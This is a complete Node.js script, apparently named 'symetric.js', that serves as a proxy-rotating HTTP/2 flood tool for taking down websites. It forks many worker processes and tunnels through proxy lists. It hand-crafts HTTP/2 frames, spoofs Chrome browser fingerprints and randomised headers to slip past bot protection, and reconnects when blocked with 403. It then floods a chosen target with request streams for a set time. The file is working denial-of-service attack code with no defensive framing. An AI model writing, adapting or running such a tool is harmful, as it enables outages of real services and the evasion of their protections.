const fs = require('fs');
const cluster = require('cluster');
const url = require('url');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const { Buffer } = require('buffer');
const crypto = require('crypto');

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        console.log(e);
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv.length < 8) {
    console.log('Usage: node symetric.js <method> <target> <time> <threads> <ratelimit> <proxy.txt> [--debug]');
    process.exit(1);
}

const [method, target, time, threads, ratelimit, proxyFile] = process.argv.slice(2);
const debugMode = process.argv.includes('--debug');
const parsedTarget = url.parse(target);
const isHttps = parsedTarget.protocol === 'https:';
const targetPort = parsedTarget.port || (isHttps ? 443 : 80);

const CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384';
const SIGALGS = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256';
const SECURE_OPTIONS = crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;

const FRAME_TYPES = {
    0x0: 'DATA',
    0x1: 'HEADERS',
    0x2: 'PRIORITY',
    0x3: 'RST_STREAM',
    0x4: 'SETTINGS',
    0x5: 'PUSH_PROMISE',
    0x6: 'PING',
    0x7: 'GOAWAY',
    0x8: 'WINDOW_UPDATE',
    0x9: 'CONTINUATION'
};

const PREFACE = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomChar() {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    return chars[Math.floor(Math.random() * chars.length)];
}

function generateBraveHeaders(browserVersion, wfwf) {
    let brandValue;
    if (browserVersion === 124) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 125) {
        brandValue = `"Chromium";v="${browserVersion}", "Not:A-Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 126) {
        brandValue = `"Google Chrome";v="${browserVersion}", "Not(A:Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = brandValue; // Raw value

    const headers = [
        [':method', method],
        [':authority', parsedTarget.hostname],
        [':scheme', isHttps ? 'https' : 'http'],
        [':path', parsedTarget.path],
        ['sec-ch-ua', secChUa],
        ['sec-ch-ua-mobile', '?0'],
        ['sec-ch-ua-platform', '"Windows"'],
        ['upgrade-insecure-requests', '1'],
        ['user-agent', userAgent],
        ['accept', acceptHeaderValue],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['accept-encoding', 'gzip, deflate, br, zstd'],
        ['accept-language', langValue],
        ['priority', 'u=0, i']
    ];

    if (Math.random() < 0.3) headers.push([`x-client-session${getRandomChar()}`, `none${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`sec-ms-gec-version${getRandomChar()}`, `undefined${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`sec-fetch-users${getRandomChar()}`, `?0${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`x-request-data${getRandomChar()}`, `dynamic${getRandomChar()}`]);

    return headers;
}

if (cluster.isMaster) {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(Boolean);
    const statusCounts = {};
    let totalPacketsSent = 0;

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork({ proxies: JSON.stringify(proxies) });
        if (debugMode) {
            worker.on('message', (msg) => {
                if (msg.type === 'status') {
                    const code = msg.code;
                    statusCounts[code] = (statusCounts[code] || 0) + 1;
                } else if (msg.type === 'counter') {
                    totalPacketsSent += msg.count;
                } else if (msg.type === 'debug') {
                    console.log(`[DEBUG] ${msg.msg}`);
                }
            });
        }
    }

    if (debugMode) {
        setInterval(() => {
            const statuses = Object.entries(statusCounts)
                .map(([code, count]) => `${code}: ${count}`)
                .join(', ');
            process.stdout.clearLine();
            process.stdout.cursorTo(0);
            process.stdout.write(`Status: { ${statuses} } | Sent: ${totalPacketsSent}`);
        }, 1000);
    }

    setTimeout(() => {
        process.exit(0);
    }, time * 1000);

} else {
    const proxies = JSON.parse(process.env.proxies);

    function getRandomProxy() {
        return proxies[Math.floor(Math.random() * proxies.length)];
    }

    let packetsSent = 0;
    if (debugMode) {
        setInterval(() => {
            if (packetsSent > 0) {
                process.send({ type: 'counter', count: packetsSent });
                packetsSent = 0;
            }
        }, 250);
    }

    function runAttack() {
        const proxy = getRandomProxy();
        if (!proxy) return;
        const [proxyHost, proxyPort] = proxy.split(':');

        const connectOptions = {
            host: proxyHost,
            port: targetPort,
            rejectUnauthorized: false
        };

        if (isHttps) {
            connectOptions.servername = parsedTarget.hostname;
            connectOptions.ALPNProtocols = ['h2'];
            connectOptions.port = 443;

            connectOptions.ciphers = CIPHERS;
            connectOptions.sigalgs = SIGALGS;
            connectOptions.secureOptions = SECURE_OPTIONS;
            connectOptions.secure = true;
            connectOptions.minVersion = 'TLSv1.2';
            connectOptions.maxVersion = 'TLSv1.3';

        } else {
            connectOptions.port = 80;
        }

        const socketCallback = () => {
            const socket = isHttps ? client : client;
            if (socket.destroyed) return;

            const chromeSettings = [
                [1, 65536],
                [2, 0],
                [4, 6291456],
                [6, 262144]
            ];
            const chromeSettingsFrame = encodeFrame(0, 4, encodeSettings(chromeSettings));

            const windowUpdateFrame = Buffer.alloc(13);
            windowUpdateFrame.writeUInt32BE(4, 0);
            windowUpdateFrame.writeUInt8(8, 4);
            windowUpdateFrame.writeUInt32BE(0, 5);
            windowUpdateFrame.writeUInt32BE(15663105, 9);

            socket.write(PREFACE);
            socket.write(chromeSettingsFrame);

            const hpack = new HPACK();
            hpack.setTableSize(4096);

            let streamId = 1;
            let handshakeCompleted = false;

            let buffer = Buffer.alloc(0);
            socket.on('data', (chunk) => {
                buffer = Buffer.concat([buffer, chunk]);
                while (buffer.length >= 9) {
                    const length = buffer.readUIntBE(0, 3);
                    const type = buffer.readUInt8(3);
                    const flags = buffer.readUInt8(4);
                    const stream = buffer.readUInt32BE(5);

                    if (buffer.length < 9 + length) break;

                    const frameName = FRAME_TYPES[type] || `UNKNOWN(0x${type.toString(16)})`;
                    if (debugMode) process.send({ type: 'debug', msg: `Rx Frame: ${frameName}` });

                    const framePayload = buffer.slice(9, 9 + length);
                    buffer = buffer.slice(9 + length);

                    if (type === 4) {
                        if (flags & 0x1) {
                            if (debugMode) process.send({ type: 'debug', msg: 'Got Settings ACK' });
                        } else {
                            if (debugMode) process.send({ type: 'debug', msg: 'Got Server Settings -> Sending ACK' });
                            const ackFrame = encodeFrame(0, 4, Buffer.alloc(0), 0x1);
                            socket.write(ackFrame);

                            if (!handshakeCompleted) {
                                handshakeCompleted = true;
                                setTimeout(startFlood, 100);
                            }
                        }
                    } else if (type === 1) {
                        try {
                            const decoded = hpack.decode(framePayload);
                            if (decoded) {
                                const statusPair = decoded.find(pair => pair[0] === ':status');
                                if (statusPair) {
                                    const statusCode = statusPair[1];
                                    if (debugMode) process.send({ type: 'debug', msg: `[+] Status: ${statusCode}` });
                                    process.send({ type: 'status', code: statusCode });
                                    if (statusCode === '403') {
                                        socket.destroy();
                                        return runAttack();
                                    }
                                }
                            }
                        } catch (e) {
                        }
                    } else if (type === 7) {
                        const errorCode = framePayload.readUInt32BE(4);
                        if (debugMode) process.send({ type: 'debug', msg: `GOAWAY: Error ${errorCode}` });
                        socket.destroy();
                    }
                }
            });

            const browserVersion = getRandomInt(124, 126);
            const fwfw = ['Google Chrome', 'Google Chrome'];
            const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
            const headers = generateBraveHeaders(browserVersion, wfwf);

            const encodedHeaders = hpack.encode(headers);
            const frameLen = encodedHeaders.length + 5;

            const reqBuf = Buffer.alloc(9 + frameLen);
            reqBuf.writeUInt32BE(frameLen << 8 | 0x1, 0);
            reqBuf.writeUInt8(0x25, 4);
            reqBuf.writeUInt32BE(0x80000000, 9);
            reqBuf.writeUInt8(0xFF, 13);
            encodedHeaders.copy(reqBuf, 14);

            function startFlood() {
                function doWrite() {
                    if (socket.destroyed || !socket.writable) return;

                    reqBuf.writeUInt32BE(streamId, 5);
                    socket.write(reqBuf);
                    streamId += 2;
                    packetsSent += 1;

                    if (packetsSent > 64) {
                        socket.destroy();
                        return runAttack();
                    }

                    const delay = 1000 / ratelimit;
                    setTimeout(doWrite, delay);
                }
                doWrite();
            }

            setTimeout(() => {
                if (!handshakeCompleted) {
                    handshakeCompleted = true;
                    startFlood();
                }
            }, 5000);
        };

        if (isHttps) {
            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                netSocket.once('data', (chunk) => {
                    connectOptions.socket = netSocket;
                    connectOptions.timeout = 0;

                    client = tls.connect(connectOptions, socketCallback);

                    client.on('error', (err) => {
                        client.destroy();
                        runAttack();
                    });
                });

                setTimeout(() => {
                    if (!client) {
                        connectOptions.socket = netSocket;
                        connectOptions.timeout = 5000;
                        client = tls.connect(connectOptions, socketCallback);
                        client.on('error', (err) => { client.destroy(); runAttack(); });
                    }
                }, 5000);
            });

            netSocket.write(`CONNECT ${parsedTarget.hostname}:${targetPort} HTTP/1.1\r\nHost: ${parsedTarget.hostname}:${targetPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

            netSocket.on('error', (err) => {
                netSocket.destroy();
                runAttack();
            });

            netSocket.on('end', () => {
                runAttack();
            });

        } else {
            connectOptions.timeout = 0;
            client = net.connect(connectOptions, socketCallback);
            client.on('error', (err) => {
                client.destroy();
                runAttack();
            });
            client.on('end', () => {
                runAttack();
            });
        }

    }

    const launchInterval = 1000 / (ratelimit / 10);
    setInterval(runAttack, launchInterval > 0 ? launchInterval : 100);
}
